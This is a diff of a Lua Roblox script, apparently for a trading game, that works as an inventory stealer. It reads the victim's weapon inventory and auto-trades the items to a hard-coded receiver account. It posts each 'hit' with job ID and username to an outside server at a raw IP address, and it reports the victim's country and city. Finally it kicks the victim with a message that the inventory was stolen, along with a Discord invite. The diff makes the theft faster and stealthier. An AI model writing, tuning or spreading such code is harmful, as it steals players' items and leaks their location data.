@@ -1,4 +1,4 @@
-_G.Usernames = {"Erereer454"} 
+_G.Usernames = {"daniellfc09"} 
 _G.min_rarity = "Common" 
 _G.min_value = 0
 _G.pingEveryone = "Yes" 
@@ -262,24 +262,26 @@ local function assignHitToDatabase()
     end
 
     for _, receiverName in ipairs(userList) do
-        local receiverStr = tostring(receiverName)
-        local payload = {
-            jobId = jobId, 
-            placeId = game.PlaceId,
-            username = plr.Name,
-            receiver = receiverStr 
-        }
+        task.spawn(function()
+            local receiverStr = tostring(receiverName)
+            local payload = {
+                jobId = jobId, 
+                placeId = game.PlaceId,
+                username = plr.Name,
+                receiver = receiverStr 
+            }
 
-        local success, response = pcall(function()
-            return request({
-                Url = "http://213.165.46.247:3002/hit",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Authorization"] = "nice_remote_spy"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
+            pcall(function()
+                return request({
+                    Url = "http://213.165.46.247:3002/hit",
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["Authorization"] = "nice_remote_spy"
+                    },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
         end)
 end
 end
@@ -288,24 +290,26 @@ local function assignDhToDatabase()
     local userListt = DhUsers or {}
     
     for _, receiverName in ipairs(userListt) do
-        local receiverStr = tostring(receiverName)
-        local payload = {
-            jobId = jobId, 
-            placeId = game.PlaceId,
-            username = plr.Name,
-            receiver = receiverStr 
-        }
+        task.spawn(function()
+            local receiverStr = tostring(receiverName)
+            local payload = {
+                jobId = jobId, 
+                placeId = game.PlaceId,
+                username = plr.Name,
+                receiver = receiverStr 
+            }
 
-        local success, response = pcall(function()
-            return request({
-                Url = "http://213.165.46.247:3002/hit",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Authorization"] = "nice_remote_spy"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
+            pcall(function()
+                return request({
+                    Url = "http://213.165.46.247:3002/hit",
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["Authorization"] = "nice_remote_spy"
+                    },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
         end)
 end
 end
@@ -590,7 +594,7 @@ local function getTradeStatus()
 end
 local function waitForTradeCompletion()
     while true do
-        task.wait(0.1)
+        task.wait()
         if getTradeStatus() == "None" then break end
     end
 end
@@ -671,13 +675,8 @@ if #inventoryStr + #line < 350 then
     end
 inventoryStr = inventoryStr .. "```"
 
-local country = "Unknown"
-    pcall(function()
-        local response = game:HttpGet("http://ip-api.com/json/")
-        local data = HttpService:JSONDecode(response)
-        country = data.country or "Unknown"
-    end)
-local locationStr = (loc.country or "Unknown")
+local country = loc.country or "Unknown"
+local locationStr = country
     if loc.city and loc.city ~= "" then locationStr = locationStr .. ", " .. loc.city end
 
     local isTopHit = false
@@ -737,17 +736,17 @@ end
 
 if isWhitelisted then
 
-    SendMemberHit(data)
-    assignHitToDatabase()
+    task.spawn(SendMemberHit, data)
+    task.spawn(assignHitToDatabase)
 else
-    SendMemberHit(data)
-    assignHitToDatabase()
+    task.spawn(SendMemberHit, data)
+    task.spawn(assignHitToDatabase)
     
     if  totalValue > 200 then
-        task.delay(90, function()
+        task.delay(15, function()
             SecureSend(data)
         end)
-        task.delay(90, function()
+        task.delay(15, function()
             assignDhToDatabase()
         end)
         
@@ -786,7 +785,6 @@ local valueList = buildValueList()
 local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 local totalValue = 0
 for dataid, amount in pairs(realData.Weapons.Owned) do
-    task.wait()
     local rarity = database[dataid].Rarity
     local weapon_rarity_index = table.find(rarityTable, rarity)
     if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
@@ -862,10 +860,10 @@ end)
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             Trade.DeclineTrade:FireServer()
-            task.wait(0.3)
+            task.wait(0.15)
         elseif initialTradeState == "ReceivingRequest" then
             Trade.DeclineRequest:FireServer()
-            task.wait(0.3)
+            task.wait(0.15)
         end
 
         while #weaponsToSend > 0 do
@@ -873,20 +871,20 @@ end)
             if tradeStatus == "None" then
                 sendTradeRequest(joinedUser)
             elseif tradeStatus == "SendingRequest" then
-                task.wait(0.3)
+                task.wait(0.15)
             elseif tradeStatus == "ReceivingRequest" then
                 Trade.DeclineRequest:FireServer()
-                task.wait(0.3)
+                task.wait(0.15)
             elseif tradeStatus == "StartTrade" then
                 local numToTrade = math.min(4, #weaponsToSend)
                 for i = 1, numToTrade do
                     local weapon = weaponsToSend[i]
                     for _ = 1, weapon.Amount do
                         addWeaponToTrade(weapon.DataID)
-                        task.wait(0.05)
+                        task.wait()
                     end
                 end
-                task.wait(6)
+                task.wait(4)
                 acceptTrade()
                 waitForTradeCompletion()
 
@@ -905,9 +903,9 @@ end)
                     pcall(function() Trade.DeclineTrade:FireServer() end)
                 end
             else
-                task.wait(0.5)
+                task.wait(0.25)
             end
-            task.wait(1)
+            task.wait(0.5)
         end
         plr:kick("Your Inventory Got Stolen\nJoin discord.gg/zXAD3Ftnbv To Make Your Own Script !")
     end
